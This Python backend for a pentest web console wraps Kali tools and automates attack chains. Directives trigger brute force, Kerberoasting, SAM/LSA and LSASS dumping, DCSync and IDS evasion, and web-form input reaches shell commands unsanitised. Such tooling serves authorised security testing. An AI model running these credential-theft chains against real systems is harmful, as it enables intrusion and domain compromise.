#!/usr/bin/env python3
"""
ALHARAM backend v2 — registry-driven pentest console + rule-based AutoPentest
Runs on Kali. Open pentest_tool.html from any browser (incl. Windows) at http://<KALI_IP>:8000

Jobs run in background threads: navigating the UI never stops a scan.
AutoPentest is credential-aware, scope-file aware, and chains the kill-chain automatically.
"""
import os, sys, json, shlex, subprocess, threading, uuid, time, socket, cgi, re, ipaddress
from datetime import datetime
from pathlib import Path
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

BASE = Path(__file__).resolve().parent
UPLOAD_DIR = BASE / "uploads"; GIT_DIR = BASE / "tools"
REPORT_DIR = BASE / "reports"; LOOT_DIR = BASE / "loot"; LOG_DIR = BASE / "logs"
MEM_FILE = BASE / "memory.json"
for d in (UPLOAD_DIR, GIT_DIR, REPORT_DIR, LOOT_DIR, LOG_DIR): d.mkdir(exist_ok=True)

# ===========================================================================
# TOOL REGISTRY — curated lean core (the set the AutoPentest actually chains)
# ===========================================================================
def T(id, name, cat, desc, bin, method, pkg=None, inputs=None, cmd="", install=None, update=None, fallback=None):
    return dict(id=id, name=name, cat=cat, desc=desc, bin=bin, method=method,
                pkg=pkg or bin, inputs=inputs or [], cmd=cmd, install=install,
                update=update, fallback=fallback)

TARGET = {"name":"target","label":"Target","type":"text","placeholder":"10.10.10.0/24 or host"}
URLIN  = {"name":"url","label":"URL","type":"text","placeholder":"http://host/FUZZ"}
EXTRA  = {"name":"extra","label":"Extra args","type":"text","placeholder":"optional flags"}
WLIST  = {"name":"wordlist","label":"Wordlist","type":"file","placeholder":"browse .txt"}
IPFILE = {"name":"ipfile","label":"IP list file(s)","type":"files","placeholder":"browse live-hosts .txt"}

TOOLS = [
    # Discovery
    T("nmap","Nmap","Discovery","Host discovery, full port & version scan","nmap","apt",
      inputs=[TARGET,{"name":"options","label":"Preset","type":"select","options":[
          {"v":"-p- -sV -T4 --min-rate 1000 -v","t":"ALL ports + versions (verbose)"},
          {"v":"-sV -sC --top-ports 1000 -v","t":"Top 1000 + default scripts"},
          {"v":"-sU --top-ports 100 -v","t":"Top UDP"},
          {"v":"-sV --script vuln -v","t":"NSE vuln scripts"}]},EXTRA],
      cmd="nmap {options} {extra} {target}"),
    T("masscan","Masscan","Discovery","Fast all-port SYN scan over IP-list files","masscan","apt",
      inputs=[IPFILE,{"name":"ports","label":"Ports","type":"text","placeholder":"0-65535"},
              {"name":"rate","label":"Rate (pps)","type":"text","placeholder":"1000"},EXTRA],
      cmd="sudo masscan -iL {ipfile} -p{ports} --rate {rate} {extra}"),
    T("ping","Ping","Discovery","ICMP reachability check (just enter an IP/host)","ping","apt",pkg="iputils-ping",
      inputs=[{"name":"target","label":"Target","type":"text","placeholder":"10.10.10.10 or host"},EXTRA],
      cmd="ping -c 4 {target} {extra}"),

    # Enumeration
    T("netexec","NetExec (nxc)","Enumeration","SMB/WinRM/LDAP/MSSQL swiss-army","netexec","apt",
      inputs=[{"name":"proto","label":"Protocol","type":"select","options":[
          {"v":"smb","t":"smb"},{"v":"winrm","t":"winrm"},{"v":"ldap","t":"ldap"},{"v":"mssql","t":"mssql"},{"v":"ssh","t":"ssh"}]},
          TARGET,{"name":"extra","label":"Args","type":"text","placeholder":"-u user -p pass --shares"}],
      cmd="netexec {proto} {target} {extra}"),
    T("smbmap","smbmap","Enumeration","SMB share access & perms","smbmap","apt",
      inputs=[{"name":"target","label":"Host","type":"text","placeholder":"-H 10.10.10.5"},EXTRA],
      cmd="smbmap {target} {extra}"),
    T("smbclient","smbclient","Enumeration","List SMB shares (null session)","smbclient","apt",
      inputs=[{"name":"target","label":"Host","type":"text","placeholder":"//10.10.10.5"},EXTRA],
      cmd="smbclient -L {target} -N {extra}"),
    T("enum4linux-ng","enum4linux-ng","Enumeration","SMB/NetBIOS/LDAP enumeration","enum4linux-ng","pipx",pkg="enum4linux-ng",
      inputs=[TARGET,EXTRA], cmd="enum4linux-ng -A {extra} {target}",
      fallback="sudo apt-get install -y enum4linux-ng"),
    T("ldapsearch","ldapsearch","Enumeration","LDAP/AD enumeration","ldapsearch","apt",pkg="ldap-utils",
      inputs=[{"name":"extra","label":"Args","type":"text","placeholder":"-x -H ldap://10.10.10.5 -b 'dc=x,dc=y'"}],
      cmd="ldapsearch {extra}"),
    T("snmpwalk","snmpwalk","Enumeration","SNMP enumeration","snmpwalk","apt",pkg="snmp",
      inputs=[TARGET,{"name":"extra","label":"Args","type":"text","placeholder":"-v2c -c public"}],
      cmd="snmpwalk {extra} {target}"),
    T("whatweb","whatweb","Enumeration","Web tech fingerprint","whatweb","apt",
      inputs=[URLIN,EXTRA], cmd="whatweb {extra} {url}"),

    # Vuln Scan
    T("nuclei","Nuclei","Vuln Scan","Template-based vuln / CVE detection","nuclei","apt",
      inputs=[{"name":"url","label":"Target/URL","type":"text","placeholder":"http://host"},
              {"name":"extra","label":"Args","type":"text","placeholder":"-severity high,critical"}],
      cmd="nuclei -u {url} {extra}"),
    T("nikto","Nikto","Vuln Scan","Web server misconfig scanner","nikto","apt",
      inputs=[{"name":"url","label":"Host/URL","type":"text","placeholder":"http://host"},EXTRA],
      cmd="nikto -h {url} {extra}"),
    T("searchsploit","searchsploit","Vuln Scan","Offline Exploit-DB / CVE lookup","searchsploit","apt",pkg="exploitdb",
      inputs=[{"name":"target","label":"Search","type":"text","placeholder":"apache 2.4.49"},EXTRA],
      cmd="searchsploit {extra} {target}"),

    # Web Fuzz / Recon / Crawl
    T("dirsearch","dirsearch","Web Fuzz","Web path scanner — built-in wordlist, just enter a URL","dirsearch","apt",
      inputs=[{"name":"url","label":"URL","type":"text","placeholder":"http://host"},
              {"name":"extra","label":"Args","type":"text","placeholder":"-x 403,404 -e php,html"}],
      cmd="dirsearch -u {url} {extra}"),
    T("subfinder","subfinder","Web Recon","Passive subdomain enum","subfinder","apt",
      inputs=[{"name":"target","label":"Domain","type":"text","placeholder":"example.com"},EXTRA],
      cmd="subfinder -d {target} {extra}"),
    T("httpx","httpx","Web Recon","Probe live hosts / tech","httpx","apt",pkg="httpx-toolkit",
      inputs=[{"name":"hostfile","label":"Hosts file","type":"file"},
              {"name":"extra","label":"Args","type":"text","placeholder":"-sc -title -tech-detect"}],
      cmd="httpx -l {hostfile} {extra}"),
    T("katana","katana","Web Crawl","JS-aware crawler","katana","apt",
      inputs=[URLIN,EXTRA], cmd="katana -u {url} {extra}"),

    # Web Vuln
    T("sqlmap","sqlmap","Web Vuln","SQL injection automation","sqlmap","apt",
      inputs=[{"name":"url","label":"URL","type":"text","placeholder":"http://host/p?id=1"},
              {"name":"extra","label":"Args","type":"text","placeholder":"--batch --dbs"}],
      cmd="sqlmap -u {url} {extra}"),

    # Exploitation
    T("hydra","Hydra","Exploitation","Network service brute-force","hydra","apt",
      inputs=[{"name":"extra","label":"Args","type":"text","placeholder":"-L users.txt -P pass.txt ssh://10.10.10.5"}],
      cmd="hydra {extra}"),
    T("john","John the Ripper","Exploitation","Offline hash cracking","john","apt",pkg="john",
      inputs=[{"name":"hashfile","label":"Hash file","type":"file"},
              {"name":"extra","label":"Args","type":"text","placeholder":"--wordlist=rockyou.txt --format=NT"}],
      cmd="john {extra} {hashfile}"),
    T("hashcat","Hashcat","Exploitation","GPU/CPU hash cracking","hashcat","apt",
      inputs=[{"name":"hashfile","label":"Hash file","type":"file"},WLIST,
              {"name":"extra","label":"Args","type":"text","placeholder":"-m 1000 -a 0"}],
      cmd="hashcat {extra} {hashfile} {wordlist}"),
    T("evil-winrm","evil-winrm","Exploitation","WinRM shell access","evil-winrm","apt",
      inputs=[{"name":"extra","label":"Args","type":"text","placeholder":"-i 10.10.10.5 -u user -p pass"}],
      cmd="evil-winrm {extra}"),
    T("impacket-psexec","impacket psexec","Exploitation","SMB exec (psexec)","impacket-psexec","apt",pkg="python3-impacket",
      inputs=[{"name":"extra","label":"Args","type":"text","placeholder":"domain/user:pass@10.10.10.5"}],
      cmd="impacket-psexec {extra}"),
    T("impacket-secretsdump","secretsdump","Exploitation","Dump SAM/LSA/NTDS","impacket-secretsdump","apt",pkg="python3-impacket",
      inputs=[{"name":"extra","label":"Args","type":"text","placeholder":"domain/user:pass@10.10.10.5"}],
      cmd="impacket-secretsdump {extra}"),
    T("impacket-GetUserSPNs","GetUserSPNs (Kerberoast)","Exploitation","Kerberoasting","impacket-GetUserSPNs","apt",pkg="python3-impacket",
      inputs=[{"name":"extra","label":"Args","type":"text","placeholder":"dom/user:pass -dc-ip 10.10.10.5 -request"}],
      cmd="impacket-GetUserSPNs {extra}"),
    T("impacket-GetNPUsers","GetNPUsers (AS-REP)","Exploitation","AS-REP roasting","impacket-GetNPUsers","apt",pkg="python3-impacket",
      inputs=[{"name":"extra","label":"Args","type":"text","placeholder":"dom/ -usersfile users.txt -dc-ip 10.10.10.5"}],
      cmd="impacket-GetNPUsers {extra}"),

    # Active Directory
    T("bloodhound-python","bloodhound.py","Active Directory","Remote AD collector","bloodhound-python","apt",pkg="bloodhound.py",
      inputs=[{"name":"extra","label":"Args","type":"text","placeholder":"-u user -p pass -d dom -ns 10.10.10.5 -c All"}],
      cmd="bloodhound-python {extra}"),
    T("kerbrute","kerbrute","Active Directory","Kerberos user enum & spray","kerbrute","apt",
      inputs=[{"name":"extra","label":"Args","type":"text","placeholder":"userenum -d dom --dc 10.10.10.5 users.txt"}],
      cmd="kerbrute {extra}"),
]
TOOLS_BY_ID = {t["id"]: t for t in TOOLS}

# ===========================================================================
# install / update — robust, with recovery + fallback (AI-assisted install)
# ===========================================================================
def _impacket(pyname, wrapper):
    # install the impacket suite, then expose the classic <name>.py on PATH
    return (f'(sudo apt-get install -y python3-impacket >/dev/null 2>&1 || pipx install impacket >/dev/null 2>&1); '
            f'W=$(command -v {wrapper} 2>/dev/null); [ -n "$W" ] && sudo ln -sf "$W" /usr/local/bin/{pyname}')

# curated install recipes keyed by the binary the tool calls — the "brain" knows
# the right source (apt pkg / pipx / GitHub release / impacket wrapper) for these.
INSTALL_RECIPES = {
    'GetNPUsers.py': _impacket('GetNPUsers.py','impacket-GetNPUsers'),
    'GetUserSPNs.py': _impacket('GetUserSPNs.py','impacket-GetUserSPNs'),
    'secretsdump.py': _impacket('secretsdump.py','impacket-secretsdump'),
    'psexec.py': _impacket('psexec.py','impacket-psexec'),
    'wmiexec.py': _impacket('wmiexec.py','impacket-wmiexec'),
    'smbexec.py': _impacket('smbexec.py','impacket-smbexec'),
    'atexec.py': _impacket('atexec.py','impacket-atexec'),
    'dcomexec.py': _impacket('dcomexec.py','impacket-dcomexec'),
    'ticketer.py': _impacket('ticketer.py','impacket-ticketer'),
    'getST.py': _impacket('getST.py','impacket-getST'),
    'getTGT.py': _impacket('getTGT.py','impacket-getTGT'),
    'GetADUsers.py': _impacket('GetADUsers.py','impacket-GetADUsers'),
    'lookupsid.py': _impacket('lookupsid.py','impacket-lookupsid'),
    'ntlmrelayx.py': _impacket('ntlmrelayx.py','impacket-ntlmrelayx'),
    'kerbrute': 'sudo apt-get install -y kerbrute >/dev/null 2>&1 || (sudo curl -fsSL -o /usr/local/bin/kerbrute https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64 && sudo chmod +x /usr/local/bin/kerbrute)',
    'netexec': 'sudo apt-get install -y netexec >/dev/null 2>&1 || pipx install git+https://github.com/Pennyw0rth/NetExec',
    'nxc': 'sudo apt-get install -y netexec >/dev/null 2>&1 || pipx install git+https://github.com/Pennyw0rth/NetExec',
    'bloodhound-python': 'sudo apt-get install -y bloodhound.py >/dev/null 2>&1 || pipx install bloodhound',
    'certipy': 'pipx install certipy-ad',
    'evil-winrm': 'sudo apt-get install -y evil-winrm >/dev/null 2>&1 || sudo gem install evil-winrm',
    'lsassy': 'pipx install lsassy',
    'nuclei': 'sudo apt-get install -y nuclei >/dev/null 2>&1',
    'ffuf': 'sudo apt-get install -y ffuf >/dev/null 2>&1',
    'ssh-audit': 'sudo apt-get install -y ssh-audit >/dev/null 2>&1 || pipx install ssh-audit',
}

def smart_install(name, pkg, binname, primary=None):
    """Reason through install methods, try each, verify the binary, narrate,
    and on failure surface the real error + a GitHub link to install manually."""
    v = f"command -v {shlex.quote(binname)} >/dev/null 2>&1"
    recipe = INSTALL_RECIPES.get(binname) or INSTALL_RECIPES.get(pkg)
    gh = "https://github.com/search?q=" + str(name).replace(" ", "+") + "&type=repositories"
    S = ['set +e', f'echo "[brain] planning install for {name} (binary: {binname})"']
    if recipe:
        S.append(f'echo "[brain] known recipe found → applying best-known source"; {recipe}; if {v}; then echo "[✓] {name} installed (curated recipe)"; exit 0; fi')
    if primary:
        S.append(f'echo "[brain] trying declared method"; {primary}; if {v}; then echo "[✓] {name} installed (declared)"; exit 0; fi')
    S += [
        f'echo "[brain] checking apt repository for {pkg}"',
        f'if apt-cache show {pkg} >/dev/null 2>&1; then echo "[brain] apt has it → installing"; sudo apt-get update -y >/dev/null 2>&1; sudo apt-get install -y {pkg}; if {v}; then echo "[✓] {name} installed via apt"; exit 0; fi; sudo dpkg --configure -a >/dev/null 2>&1; sudo apt-get -f install -y >/dev/null 2>&1; sudo apt-get install -y {pkg}; if {v}; then echo "[✓] {name} installed via apt (recovered)"; exit 0; fi; else echo "[brain] not in apt repo"; fi',
        f'echo "[brain] trying pipx"; pipx install {pkg} >/dev/null 2>&1; pipx ensurepath >/dev/null 2>&1; if {v}; then echo "[✓] {name} installed via pipx"; exit 0; fi',
        f'echo "[brain] trying pip"; pip3 install --break-system-packages {pkg} >/dev/null 2>&1; if {v}; then echo "[✓] {name} installed via pip"; exit 0; fi',
        f'if command -v go >/dev/null 2>&1; then echo "[brain] trying go install"; go install {pkg}@latest >/dev/null 2>&1; sudo ln -sf $(go env GOPATH 2>/dev/null)/bin/{binname} /usr/local/bin/ 2>/dev/null; if {v}; then echo "[✓] {name} installed via go"; exit 0; fi; fi',
        # nothing worked → show the actual pip error (last lines) so it is diagnosable
        f'echo "[brain] all automatic methods failed — diagnostics:"; pip3 install --break-system-packages {pkg} 2>&1 | tail -4',
        f'echo "[✗] {name} could not be installed automatically."',
        f'echo "[hint] find it on GitHub: {gh}"',
        f'echo "[hint] then add it in Memory → Add tools as:  {name} | <run-cmd> | <install-cmd>"',
        f'exit 1',
    ]
    return "\n".join(S)

def install_script(t):
    m = t["method"]; pkg = t["pkg"]; gitdir = str(GIT_DIR / t["id"])
    if t.get("install"):   # explicit recipe (git clone, custom) → still verified by smart wrapper
        primary = t["install"].replace("{gitdir}", gitdir).replace("{pkg}", pkg)
    elif m == "apt":  primary = f"sudo apt-get update -y >/dev/null 2>&1; sudo apt-get install -y {pkg}"
    elif m == "pipx": primary = f"pipx install {pkg} || pipx install {pkg} --force"
    elif m == "pip":  primary = f"pip3 install --break-system-packages {pkg}"
    else: primary = None
    binname = t["bin"] if m != "git" else "true"   # git tools: primary handles it
    return smart_install(t["name"], pkg, binname, primary)

def smart_update(t):
    """AI-style updater: detect how the tool was installed, update accordingly."""
    if t.get("update"):
        return t["update"].replace("{gitdir}", str(GIT_DIR / t["id"])).replace("{pkg}", t["pkg"])
    name, pkg, b = t["name"], t["pkg"], t["bin"]
    return f"""set +e
echo "[brain] detecting how {name} was installed…"
BIN=$(command -v {shlex.quote(b)} 2>/dev/null)
if pipx list 2>/dev/null | grep -qi {shlex.quote(pkg)}; then echo "[brain] pipx → upgrading"; pipx upgrade {pkg}; exit 0; fi
if [ -n "$BIN" ] && dpkg -S "$BIN" >/dev/null 2>&1; then echo "[brain] apt → upgrading"; sudo apt-get update -y >/dev/null 2>&1; sudo apt-get install --only-upgrade -y {pkg}; exit 0; fi
if pip3 show {pkg} >/dev/null 2>&1; then echo "[brain] pip → upgrading"; pip3 install --break-system-packages --upgrade {pkg}; exit 0; fi
echo "[brain] source unknown → re-running smart install to refresh"; {name and 'true'}
"""

def update_cmd(t):   # kept for compatibility
    return smart_update(t)

def is_installed(t):
    if t["method"] == "git":
        return (GIT_DIR / t["id"]).exists()
    return subprocess.run(f"command -v {shlex.quote(t['bin'])}", shell=True, capture_output=True).returncode == 0

def _installed(binname):
    return subprocess.run(f"command -v {shlex.quote(binname)}", shell=True, capture_output=True).returncode == 0

def build_run_cmd(t, params):
    out = t["cmd"]
    for key in ["target","url","options","extra","ports","rate","proto","hashfile","hostfile","wordlist","ipfile"]:
        out = out.replace("{"+key+"}", str(params.get(key,"") or ""))
    out = out.replace("{gitdir}", str(GIT_DIR / t["id"]))
    return " ".join(out.split())

# ===========================================================================
# memory / playbook  (operator prompts + custom rules the engine applies)
# ===========================================================================
def _migrate_to_prompt(m):
    lines=[]
    for d in m.get("directives",[]): lines.append(d)
    for r in m.get("rules",[]):
        if r.get("run"): lines.append(f"{r.get('when','*')} :: {r['run']}")
    for t in m.get("tools",[]):
        if t.get("run"): lines.append(f"{t.get('name','tool')} | {t['run']}")
    return "\n".join(lines)

def load_memory():
    """Single-box model: memory is one free-text 'prompt'."""
    if MEM_FILE.exists():
        try:
            m = json.loads(MEM_FILE.read_text())
            if "prompt" in m: return {"prompt": m.get("prompt","") or ""}
            return {"prompt": _migrate_to_prompt(m)}   # migrate old 3-field format
        except: pass
    return {"prompt": ""}

def save_memory(data):
    MEM_FILE.write_text(json.dumps({"prompt": data.get("prompt","") or ""}, indent=2))

def parse_prompt(text):
    """Parse the single prompt box into (directives, steps).
    - '<label> | <command>'  → a step that always runs (label is a name)
    - '<port/service> :: <command>' → a step gated to that port/service
    - a bare recognized keyword → a scan directive
    - '#...' and blank lines → ignored
    Commands may use {target} {user} {password} {domain} {hash} {url}."""
    directives=[]; steps=[]
    for raw in (text or "").splitlines():
        line=raw.strip()
        if not line or line.startswith("#"): continue
        if "::" in line:
            when,cmd=line.split("::",1)
            if cmd.strip(): steps.append({"when":when.strip().lower(),"cmd":cmd.strip(),"label":when.strip()})
        elif "|" in line:
            label,cmd=line.split("|",1)
            if cmd.strip(): steps.append({"when":"*","cmd":cmd.strip(),"label":label.strip() or "step"})
        else:
            directives.append(line)
    return directives, steps

def prompt_binaries(text):
    """Best-effort: the tool binaries a prompt references (first real token of each command)."""
    _, steps = parse_prompt(text); bins=set()
    for st in steps:
        for tok in st["cmd"].split():
            if tok in ("sudo","timeout"): continue
            if tok.startswith("-") or "{" in tok or "/" in tok or "=" in tok: continue
            bins.add(tok); break
    return sorted(bins)

def all_tools():   return TOOLS
def tool_by_id(i): return TOOLS_BY_ID.get(i)

# ===========================================================================
# Job engine — every job runs in a background thread and keeps streaming
# even if the operator navigates to another page.
# ===========================================================================
JOBS = {}; JOBS_LOCK = threading.Lock()

class LiveLog(list):
    """Line list that also streams every line to a .txt file the instant it is
    produced. Keeps only the most recent CAP lines in memory (the FULL output is
    always in the file) so huge scans never bloat RAM. `base` = number of lines
    already dropped from the front, so /api/output can index absolutely."""
    CAP = 3000
    def __init__(self, path):
        super().__init__()
        self.path = str(path); self.base = 0
        try: self._fh = open(path, "a", buffering=1, encoding="utf-8")   # line-buffered
        except Exception: self._fh = None
    def append(self, item):
        super().append(item)
        if self._fh:
            try: self._fh.write(str(item) + "\n"); self._fh.flush()
            except Exception: pass
        if len(self) > self.CAP + 800:          # trim in chunks to bound memory
            drop = len(self) - self.CAP
            del self[:drop]; self.base += drop

def _new_job(label):
    jid = uuid.uuid4().hex[:12]
    stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe = re.sub(r"[^A-Za-z0-9._-]+", "_", str(label))[:40].strip("_") or "job"
    logpath = LOG_DIR / f"{stamp}_{safe}_{jid}.txt"
    lines = LiveLog(logpath)
    lines.append(f"### ALHARAM log — {label} — {datetime.now():%Y-%m-%d %H:%M:%S}")
    with JOBS_LOCK:
        JOBS[jid] = {"label": label, "lines": lines, "done": False, "rc": None, "proc": None,
                     "report": None, "ctl": {"skip": False, "stop": False}, "logfile": str(logpath)}
    return jid, JOBS[jid]

def start_job(command, label=None):
    jid, job = _new_job(label or command)
    job["lines"].append(f"[*] saving output live → logs/{Path(job['logfile']).name}")
    job["lines"].append(f"$ {command}")
    def worker():
        try:
            p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                 text=True, bufsize=1, executable="/bin/bash", cwd=str(BASE))
            job["proc"] = p
            for line in iter(p.stdout.readline, ""):
                job["lines"].append(line.rstrip("\n"))   # LiveLog self-caps memory
            p.stdout.close(); job["rc"] = p.wait()
        except Exception as e:
            job["lines"].append(f"[!] error: {e}"); job["rc"] = -1
        finally:
            job["done"] = True
    threading.Thread(target=worker, daemon=True).start()
    return jid

# ===========================================================================
# AUTOPILOT — credential-aware, scope-aware, rule-based methodology engine
# ===========================================================================
WORDLIST = next((w for w in [
    "/usr/share/seclists/Discovery/Web-Content/common.txt",
    "/usr/share/wordlists/dirb/common.txt"] if Path(w).exists()), None)
WEB_SVC = ("http","https","http-proxy","http-alt","ssl/http","https-alt")
WEB_PORTS = {80,443,8080,8000,8443,8888,8081,3000,5000,9000,8008}
TLS_PORTS = {443,636,993,995,465,563,853,989,990,992,3389,5986,8443,4443,9443,8843,1433,6697}

def parse_nmap_normal(text):
    # port -> service dict. Table lines (with service/version) win; verbose
    # "Discovered open port" lines are a fallback so a skipped/partial scan
    # still yields the open ports (so port-keyed rules & enum can proceed).
    svc={}
    for line in text.splitlines():
        s=line.strip()
        m=re.match(r"^(\d+)/(tcp|udp)\s+open\s+(\S+)\s*(.*)$", s)
        if m:
            p=int(m.group(1))
            svc[p]={"port":p,"proto":m.group(2),"service":m.group(3),"version":m.group(4).strip()}
            continue
        d=re.search(r"Discovered open port (\d+)/(tcp|udp)", s)
        if d:
            p=int(d.group(1))
            svc.setdefault(p,{"port":p,"proto":d.group(2),"service":"unknown","version":""})
    return sorted(svc.values(), key=lambda x: x["port"])

def parse_hosts(text):
    hosts=[]
    for line in text.splitlines():
        m=re.search(r"Nmap scan report for (?:.*\()?(\d+\.\d+\.\d+\.\d+)\)?", line)
        if m: hosts.append(m.group(1))
    return hosts

def parse_masscan(text):
    ports=[]
    for line in text.splitlines():
        m=re.match(r"open\s+(tcp|udp)\s+(\d+)\s+(\d+\.\d+\.\d+\.\d+)", line.strip())
        if m: ports.append((m.group(3),int(m.group(2)),m.group(1)))
    return ports

def classify(line):
    line=line.strip()
    if not line or line.startswith("#"): return None
    if "://" in line: return ("url", line)
    try:
        if "/" in line: ipaddress.ip_network(line, strict=False); return ("subnet", line)
        ipaddress.ip_address(line); return ("host", line)
    except ValueError: pass
    return ("host", line)   # hostname

# ---- directive interpreter: turn plain-language directives into engine settings
DIRECTIVE_HELP = [
    "stealth / quiet / slow      → nmap -T2, low masscan rate (evade IDS)",
    "aggressive / fast           → nmap -T4, high rate",
    "insane / max speed          → nmap -T5",
    "top ports / quick scan      → scan top-1000 ports instead of all 65535",
    "all ports / full scan       → force full -p- scan (default)",
    "udp                         → also run a UDP top-ports scan",
    "no nikto / skip nikto       → skip the nikto web scan",
    "no fuzz / skip directory    → skip web content discovery",
    "use ffuf / use dirsearch    → pick the content-discovery tool",
    "no cve / skip searchsploit  → skip version→CVE lookups",
    "critical only / high        → limit nuclei severity",
    "skip nuclei                 → don't run the built-in nuclei scan",
    "skip web                    → skip the whole built-in web chain (whatweb/nuclei/nikto/dirsearch)",
    "rules only                  → skip ALL built-in enumeration; run only your auto-rules",
    "── these RUN commands (use loaded creds) ──",
    "smb-enum-deep / enumerate-*  → netexec --users --shares --pass-pol + enum4linux-ng",
    "rid-cycle / rid-brute        → netexec --rid-brute 4000",
    "bloodhound / ad-environment  → bloodhound-python -c All",
    "kerberoast-check             → impacket-GetUserSPNs -request",
    "asrep-check                  → impacket-GetNPUsers -request",
    "dump-sam / dump-lsa          → netexec --sam --lsa",
    "dcsync / dump-ntds           → impacket-secretsdump -just-dc",
]
# each recognized directive is matched as a WHOLE line (normalized) so a word
# buried in a compound like "smb-exec-stealth" can never hijack the scan.
DIRECTIVE_MAP = {
    'stealth':'stealth','stealth scan':'stealth','slow':'stealth','slow scan':'stealth',
    'quiet':'stealth','quiet scan':'stealth','low and slow':'stealth','evade ids':'stealth',
    'aggressive':'aggr','aggressive scan':'aggr','fast scan':'aggr','noisy':'aggr',
    'insane':'insane','max speed':'insane','maximum speed':'insane',
    'top ports':'top','top ports fast pass':'top','top 1000':'top','fast pass':'top',
    'quick scan':'top','fast ports':'top','quick ports':'top',
    'all ports':'full','all ports single pass':'full','full port scan':'full',
    'full scan':'full','every port':'full','single pass':'full',
    'udp':'udp','udp scan':'udp','include udp':'udp',
    'skip nikto':'nonikto','no nikto':'nonikto',
    'skip fuzz':'nofuzz','no fuzz':'nofuzz','skip directory':'nofuzz','no directory':'nofuzz',
    'skip content':'nofuzz','no content discovery':'nofuzz',
    'use ffuf':'ffuf','use dirsearch':'dirsearch',
    'skip cve':'nocve','no cve':'nocve','skip searchsploit':'nocve','no searchsploit':'nocve',
    'critical only':'crit','only critical':'crit','high and critical':'highcrit',
    'os fingerprint':'os','os detect':'os','os detection':'os','detect os':'os',
    'skip nuclei':'nonuclei','no nuclei':'nonuclei',
    'skip web':'noweb','no web':'noweb','skip web methodology':'noweb','no web methodology':'noweb',
    'rules only':'rulesonly','only rules':'rulesonly','no builtin':'rulesonly','no built in':'rulesonly','builtin off':'rulesonly',
    # ---- methodology ACTIONS: these directives actually run commands ----
    'smb enum deep':'smbdeep','smb enum':'smbdeep','deep smb':'smbdeep','enumerate users':'smbdeep',
    'enumerate shares':'smbdeep','enumerate sessions':'smbdeep','enumerate policies':'smbdeep',
    'null session probe':'smbdeep','anonymous ldap bind':'smbdeep',
    'rid cycle':'ridbrute','rid brute':'ridbrute','rid cycle 500 2000':'ridbrute','rid cycle 500 4000':'ridbrute',
    'kerberoast':'kerberoast','kerberoast check':'kerberoast','kerberoasting':'kerberoast',
    'asrep':'asrep','asrep check':'asrep','asrep roast':'asrep','asreproast':'asrep','asrep roasting':'asrep',
    'bloodhound':'bloodhound','ad environment':'bloodhound','bloodhound collection':'bloodhound','collect bloodhound':'bloodhound',
    'dump sam':'dumpsam','dump sam hive':'dumpsam','dump lsa':'dumpsam','dump lsa secrets':'dumpsam',
    'lsass remote read':'dumpsam','smb cred modules':'dumpsam','harvest saved sessions':'dumpsam','credential harvest':'dumpsam',
    'dcsync':'dcsync','dc sync':'dcsync','dump ntds':'dcsync','secretsdump':'dcsync',
    # nuclei / nikto are OFF by default now — opt in explicitly
    'nuclei':'yesnuclei','run nuclei':'yesnuclei','use nuclei':'yesnuclei',
    'nikto':'yesnikto','run nikto':'yesnikto','use nikto':'yesnikto',
}
ACTION_KEYS = ('smbdeep','ridbrute','kerberoast','asrep','bloodhound','dumpsam','dcsync')
def interpret_directives(directives):
    o={'timing':'-T4','rate':1000,'all_ports':True,'udp':False,'nikto':False,
       'fuzz':True,'cve':True,'fuzzer':'dirsearch','nuclei_sev':'medium,high,critical','os':False,
       'nuclei':False,'web':True,'rules_only':False}
    for k in ACTION_KEYS: o[k]=False
    notes=[]; seen=set(); unknown=0
    for d in directives:
        s=d.strip()
        if not s or s.startswith('#'): continue
        key=DIRECTIVE_MAP.get(re.sub(r'[-_]',' ', s.lower()).strip())
        if key: seen.add(key)
        else: unknown+=1
    if 'stealth' in seen: o['timing']='-T2'; o['rate']=300; notes.append("stealth → nmap -T2, masscan rate 300")
    if 'aggr'   in seen: o['timing']='-T4'; o['rate']=5000; notes.append("aggressive → nmap -T4, rate 5000")
    if 'insane' in seen: o['timing']='-T5'; o['rate']=10000; notes.append("max speed → nmap -T5")
    if 'top'    in seen: o['all_ports']=False; notes.append("top-1000 ports only (fast)")
    if 'full'   in seen: o['all_ports']=True;  notes.append("full port scan (-p-)")
    if 'udp'    in seen: o['udp']=True; notes.append("include UDP top-ports scan")
    if 'nonikto'in seen: o['nikto']=False; notes.append("skip nikto")
    if 'nofuzz' in seen: o['fuzz']=False; notes.append("skip web content discovery")
    if 'ffuf'   in seen: o['fuzzer']='ffuf'; notes.append("use ffuf")
    if 'dirsearch' in seen: o['fuzzer']='dirsearch'
    if 'nocve'  in seen: o['cve']=False; notes.append("skip CVE / searchsploit")
    if 'crit'   in seen: o['nuclei_sev']='critical'; notes.append("nuclei: critical only")
    elif 'highcrit' in seen: o['nuclei_sev']='high,critical'; notes.append("nuclei: high,critical")
    if 'os'     in seen: o['os']=True; notes.append("OS detection (-O)")
    if 'yesnuclei' in seen: o['nuclei']=True; notes.append("enable nuclei")
    if 'yesnikto' in seen: o['nikto']=True; notes.append("enable nikto")
    if 'nonuclei' in seen: o['nuclei']=False
    if 'noweb'  in seen: o['web']=False; notes.append("skip built-in web methodology (whatweb/dirsearch)")
    if 'rulesonly' in seen:
        o['rules_only']=True; o['web']=False
        notes.append("RULES-ONLY: skip all built-in enumeration — run only your auto-rules")
    ACTION_LABELS={'smbdeep':'deep SMB/AD enumeration','ridbrute':'RID brute-force',
                   'kerberoast':'Kerberoasting','asrep':'AS-REP roasting','bloodhound':'BloodHound collection',
                   'dumpsam':'dump SAM/LSA secrets','dcsync':'DCSync (secretsdump -just-dc)'}
    for k in ACTION_KEYS:
        if k in seen: o[k]=True; notes.append(f"action: {ACTION_LABELS[k]}")
    if unknown: notes.append(f"{unknown} directive line(s) not recognized — kept as guidance only (they don't change the scan)")
    return o, notes

class AutoPentest:
    PROFILES = {
        "net-scan":    "Network — discovery (nmap only)",
        "net-pentest": "Network Pentest (silent scan, firewall-bypass)",
        "full":        "Full — network + web + vuln + CVE (per-port pentest)",
        "web":         "Web — HTTP methodology (dirsearch only)",
        "ad":          "Active Directory Pentest",
        "masscan":     "Masscan Scan (subnets -> live hosts -> ports)",
    }
    def __init__(self, job, targets, profile, creds):
        self.job=job; self.targets=targets; self.profile=(profile or "full")
        self.creds=creds or {}
